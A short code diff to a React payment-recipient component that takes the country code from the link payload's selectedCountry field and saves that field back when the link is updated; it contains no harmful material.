@@ -41,12 +41,13 @@ const PaymentRecipient = () => {
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
 
+  const shippingInfo = linkData?.payload as any;
+
   // Get country from link data (must be before using currency functions)
-  const countryCode = linkData?.country_code || "SA";
+  const countryCode = shippingInfo?.selectedCountry || "SA";
   const countryData = getCountryByCode(countryCode);
   const phoneCode = countryData?.phoneCode || "+966";
 
-  const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = formatCurrency(amount, countryCode);
 
@@ -127,7 +128,8 @@ const PaymentRecipient = () => {
           address: residentialAddress,
           service: serviceName,
           amount: formattedAmount
-        }
+        },
+        selectedCountry: countryCode
       };
 
       await updateLink.mutateAsync({
